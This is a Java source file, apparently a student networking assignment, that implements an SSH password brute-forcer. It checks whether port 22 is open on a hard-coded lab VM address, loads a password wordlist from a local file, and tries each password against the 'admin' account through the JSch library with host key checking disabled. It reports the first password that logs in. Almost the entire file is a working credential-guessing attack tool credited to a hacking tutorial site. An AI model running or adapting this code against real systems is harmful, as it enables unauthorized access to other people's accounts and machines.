package matala04;

import java.net.Socket;
import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.io.FileReader;
import java.io.BufferedReader;
import com.jcraft.jsch.*;

/**
 * This class hacks the user computer by trying to guess its password. Takes a
 * file full of passwords and tries to hack using it. Has a Known port and IP =
 * SSH 22 port and the user's IP. Taken from:
 * https://www.hackingloops.com/ssh-password-cracker-java/
 * 
 * @author Dvir & Shir & Kineret
 *
 */
public class BruteHackingSSH {
	/**
	 * 
	 * @return
	 */
	public static String ssh() {
//		String host = "127.0.0.1"; // IP of VM
		String host="10.9.0.116";// IP of VM
		int port = 22; // SSH port
		String user = "admin"; // Root user name on VM
		boolean isPortOpen = false;
		// Gives IP and SSH only for checking
		isPortOpen = checkHost(host, port);
		if (isPortOpen) {
			ArrayList<String> passwords = getWordlist("C:\\Users\\admin\\eclipse-workspace\\Networking\\password.txt");
			System.out.println("Starting to crack passwords through " + port + " port on " + host
					+ "........it may take a while");
			for (int i = 0; i < passwords.size(); i++) {
				System.out.println("trying " + passwords.get(i));
				if (crackPass(host, user, passwords.get(i), port)) {
					System.out.println("Password Found! Login Achived");
					System.out.println("User: " + user);
					System.out.println("Password: " + passwords.get(i));
					return passwords.get(i);
					// System.exit(0);
				}
			}
			System.out.println("Failed to hack password for user: " + user);
		}
		return "nopassfound";
	}

	/*
	 * CheckHost - try to connect to a given port to check if it's open. 
	 *getWordList - gets all the passwords from a given file. crackPass - attempt
	 * connecting/login to the host.
	 */
	public static boolean checkHost(String host, int port) {
		boolean isOpen = false;
		try {
			System.out.println("Checking host...");
			Socket checkSock = new Socket();
			checkSock.connect(new InetSocketAddress(host, port), 1000);
			checkSock.close();
			System.out.println("Success (the specified port is open)");
			isOpen = true;
			return isOpen;
		} catch (Exception e) {
			System.out.println("Fail (the specified port is closed)");
			return isOpen;
		}
	}
	/**
	 * Takes a given file and reads from it all the passwords in it.
	 * 
	 * @param path a given path to file.
	 * @return a list of all the passwords.
	 */
	public static ArrayList<String> getWordlist(String path) {
		System.out.println("Reading wordlist...");
		ArrayList<String> wordlist = new ArrayList<String>();
		try {
			BufferedReader buffRead = new BufferedReader(new FileReader(path));
			String line = null;
			while ((line = buffRead.readLine()) != null) {
				wordlist.add(line);
			}
			buffRead.close();
			System.out.println("done");
		} catch (Exception e) {
			System.out.println("Fail");
			System.exit(1);
		}
		return wordlist;
	}
/**
 * Tries to crack computer's password.
 * @param host a given host.
 * @param user a given user name.
 * @param pass a password from the list.
 * @param port a specified port.
 * @return true for guessing the right password, false if not.
 */
	public static boolean crackPass(String host, String user, String pass, int port) {
		try {
			Session tryPass = new JSch().getSession(user, host, port);
			tryPass.setPassword(pass);
			tryPass.setConfig("StrictHostKeyChecking", "no");
			tryPass.connect(100);
			tryPass.disconnect();
		} catch (Exception e) {
			return false;
		}
		return true;
	}
}